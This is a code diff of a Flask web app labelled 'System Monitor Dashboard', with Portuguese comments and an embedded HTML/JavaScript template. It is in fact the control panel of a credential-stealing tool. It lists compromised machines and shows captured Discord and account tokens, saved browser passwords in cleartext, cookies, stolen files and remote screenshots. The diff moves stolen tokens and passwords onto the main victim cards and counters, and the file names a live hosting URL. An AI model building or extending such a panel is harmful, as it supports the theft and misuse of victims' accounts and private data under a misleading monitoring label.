@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-System Monitor Dashboard - Versão ORIGINAL DO GITHUB
+System Monitor Dashboard - Versão RESTAURADA ORIGINAL
 """
 
 import os
@@ -310,13 +310,13 @@ def get_endpoint_data(endpoint_id):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-# Template HTML ORIGINAL COMPLETO COM PARTÍCULAS E MODAL
+# Template HTML RESTAURADO - System Monitor no topo, sem aba Dados
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Monitor Dashboard</title>
+    <title>System Monitor</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -395,7 +395,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         .cards-grid { 
             display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); 
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); 
             gap: 25px; 
         }
         .card { 
@@ -530,44 +530,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         .modal-close:hover {
             color: #e0e0e0;
         }
-        .menu-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        .menu-item {
-            background: rgba(124, 58, 237, 0.1);
-            border: 1px solid rgba(124, 58, 237, 0.2);
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        .menu-item:hover {
-            background: rgba(124, 58, 237, 0.2);
-            transform: translateY(-3px);
-        }
-        .menu-icon {
-            font-size: 2rem;
-            margin-bottom: 10px;
-        }
-        .menu-title {
-            color: #a855f7;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-        .menu-desc {
-            color: #9ca3af;
-            font-size: 0.9rem;
-        }
-        .data-content {
-            display: none;
-        }
-        .data-content.active {
-            display: block;
-        }
         .card-header {
             display: flex;
             justify-content: space-between;
@@ -610,12 +572,35 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             border-radius: 8px;
             cursor: pointer;
             font-size: 0.9rem;
+            margin-right: 10px;
             margin-top: 15px;
             transition: all 0.3s ease;
         }
         .btn-dados:hover {
             transform: translateY(-2px);
             box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
+        }
+        .card-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .data-preview {
+            background: rgba(10, 10, 15, 0.6);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+        .data-preview-item {
+            margin: 5px 0;
+            padding: 5px;
+            background: rgba(168, 85, 247, 0.1);
+            border-radius: 4px;
+            word-break: break-all;
         }
     </style>
 </head>
@@ -637,19 +622,18 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <div class="stat-label">Online</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value" id="totalMetrics">0</div>
-                <div class="stat-label">Métricas</div>
+                <div class="stat-value" id="totalTokens">0</div>
+                <div class="stat-label">Tokens</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value" id="totalScreenshots">0</div>
-                <div class="stat-label">Screenshots</div>
+                <div class="stat-value" id="totalPasswords">0</div>
+                <div class="stat-label">Senhas</div>
             </div>
         </div>
 
         <div class="tabs-container">
             <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
             <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
-            <button class="tab" onclick="showTab('data')">Dados</button>
         </div>
 
         <div id="endpoints" class="tab-content active">
@@ -671,149 +655,18 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 </div>
             </div>
         </div>
-
-        <div id="data" class="tab-content">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
-            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
-                <div class="menu-grid" id="menuPrincipal">
-                    <div class="menu-item" onclick="showDataCategory('tokens')">
-                        <div class="menu-icon">🔑</div>
-                        <div class="menu-title">Tokens</div>
-                        <div class="menu-desc">Discord e outras contas</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('cookies')">
-                        <div class="menu-icon">🍪</div>
-                        <div class="menu-title">Cookies</div>
-                        <div class="menu-desc">Sessões de navegador</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('passwords')">
-                        <div class="menu-icon">🔒</div>
-                        <div class="menu-title">Senhas</div>
-                        <div class="menu-desc">Logins salvos</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('files')">
-                        <div class="menu-icon">📁</div>
-                        <div class="menu-title">Arquivos</div>
-                        <div class="menu-desc">Documentos e downloads</div>
-                    </div>
-                </div>
-
-                <div id="tokensContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🔑 Tokens Capturados</h3>
-                        <div id="tokensList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="cookiesContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🍪 Cookies do Navegador</h3>
-                        <div id="cookiesList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="passwordsContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🔒 Senhas Salvas</h3>
-                        <div id="passwordsList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="filesContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>📁 Arquivos</h3>
-                        <div id="filesList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-            </div>
-        </div>
     </div>
 
-    <!-- Modal Menu de Dados -->
+    <!-- Modal de Dados -->
     <div id="dataModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-title" id="modalTitle">📊 Menu de Dados</div>
+                <div class="modal-title" id="modalTitle">📊 Dados do Endpoint</div>
                 <span class="modal-close" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body">
-                <!-- Menu Principal -->
-                <div id="menuPrincipal" class="menu-grid">
-                    <div class="menu-item" onclick="showDataCategory('tokens')">
-                        <div class="menu-icon">🔑</div>
-                        <div class="menu-title">Tokens</div>
-                        <div class="menu-desc">Discord e outras contas</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('cookies')">
-                        <div class="menu-icon">🍪</div>
-                        <div class="menu-title">Cookies</div>
-                        <div class="menu-desc">Sessões de navegador</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('passwords')">
-                        <div class="menu-icon">🔒</div>
-                        <div class="menu-title">Senhas</div>
-                        <div class="menu-desc">Logins salvos</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('files')">
-                        <div class="menu-icon">📁</div>
-                        <div class="menu-title">Arquivos</div>
-                        <div class="menu-desc">Documentos e downloads</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('system')">
-                        <div class="menu-icon">🖥️</div>
-                        <div class="menu-title">Sistema</div>
-                        <div class="menu-desc">Informações do PC</div>
-                    </div>
-                    <div class="menu-item" onclick="showDataCategory('screenshot')">
-                        <div class="menu-icon">📸</div>
-                        <div class="menu-title">Screenshot</div>
-                        <div class="menu-desc">Tela do PC</div>
-                    </div>
-                </div>
-
-                <!-- Conteúdo das Categorias -->
-                <div id="tokensContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🔑 Tokens Capturados</h3>
-                        <div id="tokensList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="cookiesContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🍪 Cookies do Navegador</h3>
-                        <div id="cookiesList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="passwordsContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🔒 Senhas Salvas</h3>
-                        <div id="passwordsList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="filesContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>📁 Arquivos</h3>
-                        <div id="filesList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="systemContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>🖥️ Informações do Sistema</h3>
-                        <div id="systemList"><div class="empty-state">Carregando...</div></div>
-                    </div>
-                </div>
-                <div id="screenshotDataContent" class="data-content">
-                    <button class="back-btn" onclick="showMenu()">← Voltar ao Menu</button>
-                    <div class="data-section">
-                        <h3>📸 Screenshots Capturadas</h3>
-                        <div id="screenshotData"><div class="empty-state">Carregando...</div></div>
-                    </div>
+                <div id="modalContent">
+                    <!-- Conteúdo será carregado dinamicamente -->
                 </div>
             </div>
         </div>
@@ -875,9 +728,8 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         animateParticles();
 
         // Variáveis globais
-        let currentEndpointId = null;
-        let currentEndpointData = null;
         let currentEndpoint = null;
+        let endpointsData = {};
 
         function showTab(tabName) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -903,12 +755,24 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 }
 
                 let selectHtml = '<option value="">Selecione um endpoint...</option>';
+                let totalTokens = 0;
+                let totalPasswords = 0;
                 
                 endpoints.forEach(e => {
                     selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                     
                     const card = document.createElement('div');
                     card.className = 'card';
+                    
+                    // Busca dados do endpoint
+                    const tokens = endpointsData[e.id]?.tokens?.tokens || [];
+                    const passwords = endpointsData[e.id]?.passwords?.passwords || [];
+                    const cookies = endpointsData[e.id]?.cookies?.cookies || [];
+                    const files = endpointsData[e.id]?.files?.files || [];
+                    
+                    totalTokens += tokens.length;
+                    totalPasswords += passwords.length;
+                    
                     card.innerHTML = `
                         <div class="card-header">
                             <span class="card-title">${e.hostname}</span>
@@ -922,7 +786,27 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                             <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
                             <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
                         </div>
-                        <button class="btn-dados" onclick="openDataModal('${e.id}', '${e.hostname}')">📊 Ver Dados</button>
+                        
+                        ${tokens.length > 0 ? `
+                            <div class="data-preview">
+                                <strong style="color: #a855f7;">🔑 Tokens (${tokens.length}):</strong>
+                                ${tokens.slice(0, 3).map(t => `<div class="data-preview-item">${t.token || t}</div>`).join('')}
+                                ${tokens.length > 3 ? `<div class="data-preview-item">... e mais ${tokens.length - 3}</div>` : ''}
+                            </div>
+                        ` : ''}
+                        
+                        ${passwords.length > 0 ? `
+                            <div class="data-preview">
+                                <strong style="color: #a855f7;">🔒 Senhas (${passwords.length}):</strong>
+                                ${passwords.slice(0, 3).map(p => `<div class="data-preview-item">${p.url || 'N/A'}: ${p.username || 'N/A'}</div>`).join('')}
+                                ${passwords.length > 3 ? `<div class="data-preview-item">... e mais ${passwords.length - 3}</div>` : ''}
+                            </div>
+                        ` : ''}
+                        
+                        <div class="card-actions">
+                            <button class="btn-dados" onclick="openDataModal('${e.id}', '${e.hostname}')">📊 Ver Todos</button>
+                            <button class="btn-dados" onclick="requestScreenshot('${e.id}')">📸 Screenshot</button>
+                        </div>
                     `;
                     container.appendChild(card);
                 });
@@ -931,6 +815,8 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 
                 document.getElementById('totalEndpoints').textContent = endpoints.length;
                 document.getElementById('onlineEndpoints').textContent = endpoints.filter(e => e.status === 'online').length;
+                document.getElementById('totalTokens').textContent = totalTokens;
+                document.getElementById('totalPasswords').textContent = totalPasswords;
                 
             } catch(e) {
                 console.error('Erro ao carregar endpoints:', e);
@@ -938,106 +824,57 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             }
         }
 
-        async function openDataModal(endpointId, hostname) {
-            currentEndpointId = endpointId;
-            document.getElementById('modalTitle').textContent = `📊 ${hostname}`;
-            document.getElementById('dataModal').style.display = 'block';
-            showMenu();
-
-            // Carrega os dados
+        async function loadEndpointData(endpointId) {
             try {
                 const res = await fetch(`/api/endpoint_data/${endpointId}`);
-                currentEndpointData = await res.json();
+                const data = await res.json();
+                endpointsData[endpointId] = data;
+                return data;
             } catch(e) {
-                console.error('Erro ao carregar dados:', e);
+                console.error('Erro ao carregar dados do endpoint:', e);
+                return null;
             }
+        }
+
+        async function openDataModal(endpointId, hostname) {
+            const data = await loadEndpointData(endpointId);
+            if (!data) return;
+            
+            document.getElementById('modalTitle').textContent = `📊 ${hostname}`;
+            document.getElementById('dataModal').style.display = 'block';
+            
+            const modalContent = document.getElementById('modalContent');
+            
+            const tokens = data.tokens?.tokens || [];
+            const passwords = data.passwords?.passwords || [];
+            const cookies = data.cookies?.cookies || [];
+            const files = data.files?.files || [];
+            
+            modalContent.innerHTML = `
+                <div class="data-section">
+                    <h3>🔑 Tokens (${tokens.length})</h3>
+                    ${tokens.length > 0 ? tokens.map(t => `<div class="token-card">${t.token || t}</div>`).join('') : '<div class="empty-state">Nenhum token encontrado</div>'}
+                </div>
+                
+                <div class="data-section">
+                    <h3>🔒 Senhas (${passwords.length})</h3>
+                    ${passwords.length > 0 ? passwords.map(p => `<div class="password-card"><strong>URL:</strong> ${p.url || 'N/A'}<br><strong>Usuário:</strong> ${p.username || 'N/A'}<br><strong>Senha:</strong> ${p.password || 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhuma senha encontrada</div>'}
+                </div>
+                
+                <div class="data-section">
+                    <h3>🍪 Cookies (${cookies.length})</h3>
+                    ${cookies.length > 0 ? cookies.map(c => `<div class="cookie-card"><strong>Host:</strong> ${c.host || 'N/A'}<br><strong>Nome:</strong> ${c.name || 'N/A'}<br><strong>Valor:</strong> ${c.value ? c.value.substring(0, 100) + (c.value.length > 100 ? '...' : '') : 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum cookie encontrado</div>'}
+                </div>
+                
+                <div class="data-section">
+                    <h3>📁 Arquivos (${files.length})</h3>
+                    ${files.length > 0 ? files.map(f => `<div class="token-card"><strong>Nome:</strong> ${f.name || f.filename}<br><strong>Tamanho:</strong> ${f.size ? (f.size / 1024).toFixed(2) + ' KB' : 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum arquivo encontrado</div>'}
+                </div>
+            `;
         }
 
         function closeModal() {
             document.getElementById('dataModal').style.display = 'none';
-            currentEndpointId = null;
-            currentEndpointData = null;
-        }
-
-        function showMenu() {
-            document.getElementById('menuPrincipal').style.display = 'grid';
-            document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
-        }
-
-        function showDataCategory(category) {
-            document.getElementById('menuPrincipal').style.display = 'none';
-            document.querySelectorAll('.data-content').forEach(c => c.classList.remove('active'));
-
-            if (!currentEndpointData) return;
-
-            const data = currentEndpointData;
-
-            switch(category) {
-                case 'tokens':
-                    const tokens = data.tokens?.tokens || [];
-                    const tokensHtml = tokens.length > 0 
-                        ? tokens.map(t => `<div class="token-card">${t.token || t}</div>`).join('')
-                        : '<div class="empty-state">Nenhum token capturado</div>';
-                    document.getElementById('tokensList').innerHTML = tokensHtml;
-                    document.getElementById('tokensContent').classList.add('active');
-                    break;
-
-                case 'cookies':
-                    const cookies = data.cookies?.cookies || [];
-                    const cookiesHtml = cookies.length > 0
-                        ? cookies.map(c => `<div class="cookie-card">${c.domain || ''}: ${c.name || c}</div>`).join('')
-                        : '<div class="empty-state">Nenhum cookie capturado</div>';
-                    document.getElementById('cookiesList').innerHTML = cookiesHtml;
-                    document.getElementById('cookiesContent').classList.add('active');
-                    break;
-
-                case 'passwords':
-                    const passwords = data.passwords?.passwords || [];
-                    const passwordsHtml = passwords.length > 0
-                        ? passwords.map(p => `<div class="password-card">${p.url || ''}: ${p.username || ''} / ${p.password || p}</div>`).join('')
-                        : '<div class="empty-state">Nenhuma senha capturada</div>';
-                    document.getElementById('passwordsList').innerHTML = passwordsHtml;
-                    document.getElementById('passwordsContent').classList.add('active');
-                    break;
-
-                case 'files':
-                    const files = data.files?.files || [];
-                    const filesHtml = files.length > 0
-                        ? files.map(f => `<div class="token-card">${f.name || f.filename}: ${(f.size / 1024).toFixed(2)} KB</div>`).join('')
-                        : '<div class="empty-state">Nenhum arquivo encontrado</div>';
-                    document.getElementById('filesList').innerHTML = filesHtml;
-                    document.getElementById('filesContent').classList.add('active');
-                    break;
-
-                case 'system':
-                    const systemHtml = data.system ? `
-                        <div class="token-card">
-                            <strong>Hostname:</strong> ${data.system.hostname || 'N/A'}<br>
-                            <strong>Usuário:</strong> ${data.system.user || 'N/A'}<br>
-                            <strong>IP Local:</strong> ${data.system.ip_address || 'N/A'}<br>
-                            <strong>IP Externo:</strong> ${data.system.external_ip || 'N/A'}<br>
-                            <strong>Plataforma:</strong> ${data.system.platform || 'N/A'}<br>
-                            <strong>RAM:</strong> ${data.system.ram || 'N/A'}<br>
-                        </div>
-                    ` : '<div class="empty-state">Dados do sistema não disponíveis</div>';
-                    document.getElementById('systemList').innerHTML = systemHtml;
-                    document.getElementById('systemContent').classList.add('active');
-                    break;
-
-                case 'screenshot':
-                    const screenshots = data.screenshots?.screenshots || [];
-                    const screenshotsHtml = screenshots.length > 0
-                        ? screenshots.map(s => `
-                            <div class="token-card">
-                                <strong>Data:</strong> ${new Date(s.timestamp).toLocaleString()}<br>
-                                <img src="data:image/png;base64,${s.image}" style="max-width: 100%; border-radius: 8px; margin-top: 10px;" alt="Screenshot">
-                            </div>
-                        `).join('')
-                        : '<div class="empty-state">Nenhuma screenshot encontrada</div>';
-                    document.getElementById('screenshotData').innerHTML = screenshotsHtml;
-                    document.getElementById('screenshotDataContent').classList.add('active');
-                    break;
-            }
         }
 
         async function loadScreenshots() {
@@ -1057,8 +894,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     `;
                     container.appendChild(div);
                 });
-
-                document.getElementById('totalScreenshots').textContent = Object.keys(screenshots).length;
 
                 if (Object.keys(screenshots).length === 0) {
                     container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
@@ -1106,16 +941,20 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             }
         }
 
-        function loadAllData() {
-            loadEndpoints();
+        async function loadAllData() {
+            // Carrega endpoints primeiro
+            await loadEndpoints();
+            
+            // Depois carrega dados de cada endpoint
+            const endpoints = await fetch('/api/endpoints').then(r => r.json());
+            for (const endpoint of endpoints) {
+                await loadEndpointData(endpoint.id);
+            }
+            
+            // Recarrega endpoints com os dados
+            await loadEndpoints();
+            
             loadScreenshots();
-
-            fetch('/api/metrics_data')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('totalMetrics').textContent = data.length;
-                })
-                .catch(error => console.error('Error loading metrics:', error));
         }
 
         // Carrega dados iniciais
@@ -1124,24 +963,18 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         // Atualiza a cada 30 segundos
         setInterval(loadAllData, 30000);
 
-        // Verifica screenshots solicitadas a cada 10 segundos
-        setInterval(() => {
-            if (currentEndpoint) {
-                fetch(`/api/screenshot_requests/${currentEndpoint}`)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.request_screenshot) {
-                            loadScreenshots();
-                        }
-                    })
-                    .catch(error => console.error('Error checking screenshot request:', error));
+        // Fecha modal ao clicar fora
+        window.onclick = function(event) {
+            const modal = document.getElementById('dataModal');
+            if (event.target == modal) {
+                closeModal();
             }
-        }, 10000);
+        }
     </script>
 </body>
 </html>"""
 
 if __name__ == '__main__':
-    print("Iniciando System Monitor ORIGINAL...")
+    print("Iniciando System Monitor RESTAURADO...")
     print("Acessar: https://web-production-49d37.up.railway.app")
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
